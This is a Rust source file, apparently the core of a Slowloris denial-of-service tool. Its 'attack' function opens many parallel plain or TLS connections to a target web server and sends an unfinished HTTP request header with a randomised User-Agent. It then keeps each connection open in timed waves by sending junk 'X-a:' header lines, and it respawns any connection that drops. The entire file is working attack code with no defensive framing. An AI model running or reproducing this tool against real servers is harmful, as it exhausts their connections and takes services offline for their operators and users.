extern crate native_tls;
extern crate rand;
extern crate rayon;
extern crate url;

mod consts;
mod types;
mod err;
mod address;

use types::Stream;
use err::LorisError;
use address::Address;

use native_tls::TlsConnector;
use rand::Rng;
use rayon::prelude::*;

use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;

pub fn attack(addr: &str, timeout: u64, requests: u64, waves: u64) -> Result<(), LorisError> {
    println!("Preparing connections...");
    let addr: Address = addr.parse()?;
    let init_header = get_init_header(&addr);
    let mut connections: Vec<_> = (0..requests)
        .into_par_iter()
        .map(|_| spawn_connection(&addr, &init_header))
        .collect();

    println!(
        "Starting attack on {} with {} requests in {} waves, each lasting {} ms",
        addr, requests, waves, timeout
    );
    for i in 0..waves {
        println!("Attack wave {}/{}", i + 1, waves);
        connections.par_iter_mut().for_each(|connection| {
            let loris_header = get_loris_header();
            let res = connection.write_all(&loris_header);
            if res.is_err() {
                println!("A connection timed out, recreating it... ");
                let mut new_connection = spawn_connection(&addr, &init_header);
                std::mem::swap(connection, &mut new_connection);
            }
        });
        thread::sleep(Duration::from_millis(timeout));
    }
    Ok(())
}

fn get_stream(addr: &Address) -> Stream<TcpStream> {
    let domain = addr.host();
    let port = addr.port_or_known_default();
    let stream = TcpStream::connect((domain, port))
        .expect(&format!("Failed to connect to {}:{}", domain, port));
    if addr.is_https() {
        let connector = TlsConnector::builder()
            .expect("Failed to create TlsConnectorBuilder")
            .build()
            .expect("Failed to build TlsConnector");
        Stream::Tls(
            connector
                .connect(domain, stream)
                .expect(&format!("Failed to connect to {} via TLS", domain)),
        )
    } else {
        Stream::Plain(stream)
    }
}

fn spawn_connection(addr: &Address, init_header: &[u8]) -> Stream<TcpStream> {
    let mut stream = get_stream(addr);
    stream
        .write_all(init_header)
        .expect(&format!("Failed to send header to {}", addr));
    stream
}

fn get_init_header(addr: &Address) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let user_agent = consts::USER_AGENTS[rng.gen_range(0, consts::USER_AGENTS.len())];
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n",
        addr.path(),
        addr.host(),
        user_agent
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!("X-a: {}\r\n", rand::random::<u64>())
        .as_bytes()
        .to_vec()
}
